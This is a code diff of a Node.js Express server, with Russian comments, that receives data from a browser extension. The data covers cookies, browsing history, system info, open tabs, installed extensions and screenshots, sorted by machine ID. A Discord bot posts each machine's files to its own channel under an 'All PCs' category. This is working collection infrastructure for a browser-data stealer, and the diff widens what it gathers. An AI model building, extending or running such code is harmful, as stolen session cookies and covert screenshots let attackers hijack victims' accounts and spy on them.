@@ -1,82 +1,65 @@
 import express from "express";
-import { Client, GatewayIntentBits } from "discord.js";
+import { Client, GatewayIntentBits, ChannelType } from "discord.js";
 
 const app = express();
 app.use(express.json({ limit: "10mb" }));
 
-// Переменные окружения (Railway -> Settings -> Variables)
 const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
 const GUILD_ID = process.env.GUILD_ID;
 const CATEGORY_NAME = "Все ПК";
 
-// Запускаем Discord бота
+// Инициализация Discord бота
 const bot = new Client({ intents: [GatewayIntentBits.Guilds] });
 
-bot.once("ready", () => {
+bot.once("clientReady", () => {
   console.log(`✅ Бот вошёл как ${bot.user.tag}`);
 });
 
-// Хелпер: получить или создать категорию
+// Получаем или создаём категорию
 async function getOrCreateCategory(guild, name) {
-  let category = guild.channels.cache.find(
-    (c) => c.type === 4 && c.name === name
-  );
+  let category = guild.channels.cache.find(c => c.type === ChannelType.GuildCategory && c.name === name);
   if (!category) {
-    category = await guild.channels.create({
-      name,
-      type: 4,
-    });
+    category = await guild.channels.create({ name, type: ChannelType.GuildCategory });
   }
   return category;
 }
 
-// Хелпер: получить или создать текстовый канал
+// Получаем или создаём текстовый канал
 async function getOrCreateTextChannel(guild, name, parentId) {
   if (!name) throw new Error("Channel name is required!");
-  
-  // Сначала пытаемся найти существующий канал
   let channel = guild.channels.cache.find(
-    (c) => c.type === 0 && c.name === name && c.parentId === parentId
+    c => c.type === ChannelType.GuildText && c.name === name && c.parentId === parentId
   );
-
-  // Если не нашли — создаём новый
   if (!channel) {
     channel = await guild.channels.create({
-      name: name,
-      type: 0,          // текстовый канал
-      parent: parentId, // id категории
+      name,
+      type: ChannelType.GuildText,
+      parent: parentId
     });
   }
   return channel;
 }
 
-
 // Маршрут для загрузки данных от расширения
 app.post("/upload", async (req, res) => {
   try {
-    const { pcName, cookies, history, systemInfo } = req.body;
+    const { pcId, cookies, history, systemInfo, tabs, extensions, screenshot } = req.body;
+    if (!pcId) return res.status(400).json({ error: "pcId is required" });
 
     const guild = await bot.guilds.fetch(GUILD_ID);
     const category = await getOrCreateCategory(guild, CATEGORY_NAME);
-    const channel = await getOrCreateTextChannel(guild, pcName, category.id);
+    const channel = await getOrCreateTextChannel(guild, pcId, category.id);
 
-    // Отправляем файлы
-    await channel.send({
-      files: [
-        {
-          attachment: Buffer.from(JSON.stringify(cookies, null, 2)),
-          name: `${pcName}-cookies.json`,
-        },
-        {
-          attachment: Buffer.from(JSON.stringify(history, null, 2)),
-          name: `${pcName}-history.json`,
-        },
-        {
-          attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)),
-          name: `${pcName}-system.json`,
-        },
-      ],
-    });
+    const files = [];
+
+    if (cookies) files.push({ attachment: Buffer.from(JSON.stringify(cookies, null, 2)), name: `${pcId}-cookies.json` });
+    if (history) files.push({ attachment: Buffer.from(JSON.stringify(history, null, 2)), name: `${pcId}-history.json` });
+    if (systemInfo) files.push({ attachment: Buffer.from(JSON.stringify(systemInfo, null, 2)), name: `${pcId}-system.json` });
+    if (tabs) files.push({ attachment: Buffer.from(JSON.stringify(tabs, null, 2)), name: `${pcId}-tabs.json` });
+    if (extensions) files.push({ attachment: Buffer.from(JSON.stringify(extensions, null, 2)), name: `${pcId}-extensions.json` });
+    if (screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` });
+
+    if (files.length > 0) await channel.send({ files });
 
     res.json({ success: true });
   } catch (err) {
@@ -85,9 +68,7 @@ app.post("/upload", async (req, res) => {
   }
 });
 
-// Запуск сервера
+// Сервер
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => console.log(`🚀 Сервер слушает порт ${PORT}`));
-
-// Запуск бота
 bot.login(DISCORD_BOT_TOKEN);
